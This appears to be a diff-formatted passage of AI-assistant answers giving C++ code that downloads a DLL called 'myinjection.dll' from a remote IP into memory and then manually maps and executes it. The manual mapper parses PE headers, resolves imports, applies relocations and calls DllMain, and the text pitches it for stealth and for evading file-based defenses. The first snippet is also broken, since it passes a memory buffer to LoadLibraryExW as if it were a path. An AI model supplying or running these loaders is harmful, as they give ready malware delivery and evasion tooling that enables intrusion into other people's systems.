+    LPVOID buffer = NULL;
+
+    do {
+        dwSize = 0;
+        WinHttpQueryDataAvailable(hRequest, &dwSize);
+
+        if (dwSize > 0) {
+            buffer = realloc(buffer, totalSize + dwSize);
+            if (!buffer) {
+                WinHttpCloseHandle(hRequest);
+                WinHttpCloseHandle(hConnect);
+                WinHttpCloseHandle(hSession);
+                return false;
+            }
+
+            if (WinHttpReadData(hRequest, (LPVOID)((BYTE*)buffer + totalSize), dwSize, &dwDownloaded)) {
+                totalSize += dwDownloaded;
+            }
+        }
+    } while (dwSize > 0);
+
+    // Clean up
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    *pBuffer = buffer;
+    *pSize = totalSize;
+    return true;
+}
+
+int main() {
+    const wchar_t* url = L"https://192.168.45.250:8000/myinjection.dll";
+    LPVOID dllBuffer = NULL;
+    DWORD dllSize = 0;
+
+    if (DownloadFileToMemory(url, &dllBuffer, &dllSize)) {
+        std::wcout << L"Download successful, loading DLL into memory." << std::endl;
+
+        // Load the DLL from memory
+        HMODULE hModule = LoadLibraryExW((LPCWSTR)dllBuffer, NULL, DONT_RESOLVE_DLL_REFERENCES);
+        if (hModule) {
+            std::wcout << L"DLL loaded successfully." << std::endl;
+
+            // Now you can use GetProcAddress to locate functions and execute them.
+
+            // Free the DLL module
+            FreeLibrary(hModule);
+        } else {
+            std::wcout << L"Failed to load DLL from memory." << std::endl;
+        }
+
+        // Free the allocated memory
+        free(dllBuffer);
+    } else {
+        std::wcout << L"Download failed." << std::endl;
+    }
+
+    return 0;
+}
+```
+
+### Explanation:
+
+1. **Download to Memory**:
+   - The `DownloadFileToMemory` function downloads the DLL to memory instead of saving it to disk. The downloaded data is stored in a dynamically allocated buffer.
+   - Memory is reallocated as needed to accommodate the entire DLL.
+
+2. **Loading the DLL**:
+   - `LoadLibraryExW` is used to load the DLL from the memory buffer. However, this function expects a path, so it's necessary to have a valid path or use a custom loader.
+   - To truly load a DLL from memory without writing to disk, you'd need to manually map the PE (Portable Executable) headers and sections, resolve imports, and handle relocations—this is a non-trivial task and is typically done in advanced malware.
+
+3. **Freeing Resources**:
+   - The DLL module is unloaded using `FreeLibrary`, and the allocated memory is freed using `free`.
+
+### Advanced Approach:
+To load a DLL directly from memory without ever writing it to disk, you'd need to perform manual PE loading, which involves:
+
+- **Parsing the PE Headers**: Extracting information about sections, imports, and relocations.
+- **Mapping Sections**: Allocating memory for each section and copying it to the correct location.
+- **Resolving Imports**: Handling all the dynamic imports that the DLL requires.
+- **Handling Relocations**: Adjusting addresses if the DLL is not loaded at its preferred base address.
+
+This approach is much more complex and requires in-depth knowledge of the Windows PE file format and memory management.
+
+### Practical Consideration:
+Using `LoadLibrary` after saving the DLL to disk (even temporarily) is more straightforward, but if your goal is stealth or avoiding detection by file-based defenses, manual loading would be the way to go. However, it's important to note that these techniques should only be used in legal and ethical scenarios, such as controlled red team exercises or educational purposes.
+
+
+Certainly! Below is an example of how you can manually load a DLL from memory using C++. This approach involves parsing the PE (Portable Executable) headers, mapping sections to memory, resolving imports, and handling relocations.
+
+This example is somewhat simplified but should give you a good starting point for understanding how to manually load a DLL from memory.
+
+### Advanced Manual DLL Loading Example
+
+```cpp
+#include <windows.h>
+#include <winnt.h>
+
+typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
+typedef FARPROC(WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
+typedef void(__stdcall* DLL_ENTRY_POINT)(void*, DWORD, void*);
+
+struct MANUAL_MAPPING_DATA {
+    pLoadLibraryA pLoadLibraryA;
+    pGetProcAddress pGetProcAddress;
+    HMODULE hModule;
+};
+
+bool ManualMapDLL(void* pDLLBuffer) {
+    IMAGE_DOS_HEADER* pDOSHeader = (IMAGE_DOS_HEADER*)pDLLBuffer;
+    IMAGE_NT_HEADERS* pNTHeaders = (IMAGE_NT_HEADERS*)((BYTE*)pDLLBuffer + pDOSHeader->e_lfanew);
+    
+    BYTE* pTargetBase = (BYTE*)VirtualAlloc(NULL, pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!pTargetBase) return false;
+
+    // Copy the headers
+    memcpy(pTargetBase, pDLLBuffer, pNTHeaders->OptionalHeader.SizeOfHeaders);
+
+    // Copy sections
+    IMAGE_SECTION_HEADER* pSectionHeader = (IMAGE_SECTION_HEADER*)(pNTHeaders + 1);
+    for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
+        BYTE* pSectionDest = pTargetBase + pSectionHeader[i].VirtualAddress;
+        BYTE* pSectionSrc = (BYTE*)pDLLBuffer + pSectionHeader[i].PointerToRawData;
+        memcpy(pSectionDest, pSectionSrc, pSectionHeader[i].SizeOfRawData);
+    }
+
+    // Resolve imports
+    IMAGE_DATA_DIRECTORY importDirectory = pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    IMAGE_IMPORT_DESCRIPTOR* pImportDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)(pTargetBase + importDirectory.VirtualAddress);
+
+    while (pImportDescriptor->Name) {
+        char* szModule = (char*)(pTargetBase + pImportDescriptor->Name);
+        HMODULE hModule = LoadLibraryA(szModule);
+
+        IMAGE_THUNK_DATA* pThunkData = (IMAGE_THUNK_DATA*)(pTargetBase + pImportDescriptor->FirstThunk);
+        while (pThunkData->u1.AddressOfData) {
+            if (pThunkData->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
+                // Import by ordinal
+                pThunkData->u1.Function = (DWORD_PTR)GetProcAddress(hModule, (LPCSTR)(pThunkData->u1.Ordinal & 0xFFFF));
+            } else {
+                // Import by name
+                IMAGE_IMPORT_BY_NAME* pImportByName = (IMAGE_IMPORT_BY_NAME*)(pTargetBase + pThunkData->u1.AddressOfData);
+                pThunkData->u1.Function = (DWORD_PTR)GetProcAddress(hModule, pImportByName->Name);
+            }
+            pThunkData++;
+        }
+        pImportDescriptor++;
+    }
+
+    // Handle relocations
+    IMAGE_DATA_DIRECTORY relocationDirectory = pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    if (relocationDirectory.Size) {
+        IMAGE_BASE_RELOCATION* pReloc = (IMAGE_BASE_RELOCATION*)(pTargetBase + relocationDirectory.VirtualAddress);
+        while (pReloc->VirtualAddress) {
+            DWORD dwDelta = (DWORD)(pTargetBase - pNTHeaders->OptionalHeader.ImageBase);
+            WORD* pRelInfo = (WORD*)(pReloc + 1);
+            for (UINT i = 0; i < ((pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD)); i++) {
+                if (pRelInfo[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
+                    DWORD* pPatch = (DWORD*)(pTargetBase + pReloc->VirtualAddress + (pRelInfo[i] & 0xFFF));
+                    *pPatch += dwDelta;
+                }
+            }
+            pReloc = (IMAGE_BASE_RELOCATION*)((BYTE*)pReloc + pReloc->SizeOfBlock);
+        }
+    }
+
+    // Call the entry point
+    if (pNTHeaders->OptionalHeader.AddressOfEntryPoint) {
+        DLL_ENTRY_POINT DllEntryPoint = (DLL_ENTRY_POINT)(pTargetBase + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
+        DllEntryPoint(pTargetBase, DLL_PROCESS_ATTACH, NULL);
+    }
+
+    return true;
+}
+
+int main() {
+    // Assume pDLLBuffer is a pointer to the loaded DLL in memory
+    void* pDLLBuffer = /* Load your DLL into memory here */;
+
+    if (ManualMapDLL(pDLLBuffer)) {
+        MessageBoxA(NULL, "DLL Loaded Successfully", "Success", MB_OK);
+    } else {
+        MessageBoxA(NULL, "Failed to Load DLL", "Error", MB_OK);
+    }
+
+    return 0;
+}
+```
+
+### Key Steps in Manual Mapping:
+
+1. **Parsing PE Headers**:
+   - The `IMAGE_DOS_HEADER` and `IMAGE_NT_HEADERS` structures are used to parse the headers of the DLL.
+
+2. **Allocating Memory**:
+   - Memory is allocated using `VirtualAlloc` for the entire image size of the DLL.
+
+3. **Copying Sections**:
+   - The headers and sections are copied into the allocated memory space.
+
+4. **Resolving Imports**:
+   - The imports are resolved by iterating through the import table and loading the necessary modules and functions.
+
+5. **Handling Relocations**:
+   - If the DLL is not loaded at its preferred base address, relocations are applied to fix addresses.
+
+6. **Calling the Entry Point**:
+   - The DLL's entry point (`DllMain`) is called with `DLL_PROCESS_ATTACH` to initialize the DLL.
+
+### Notes:
+
+- **Relocations**: Adjustments to the memory addresses if the DLL is not loaded at its preferred base address.
+- **Imports**: Functions from other modules that the DLL depends on.
+- **Entry Point**: The main function of the DLL that is called during loading.
+
+### Considerations:
+
+- **Complexity**: This code provides a basic outline, but real-world manual mapping can be more complex, especially with advanced features like TLS callbacks, thread-local storage, or more complex import tables.
+- **Security**: Manual DLL mapping is a technique used by advanced malware to avoid detection, so it should be used responsibly and only in legal contexts, such as red teaming or research.
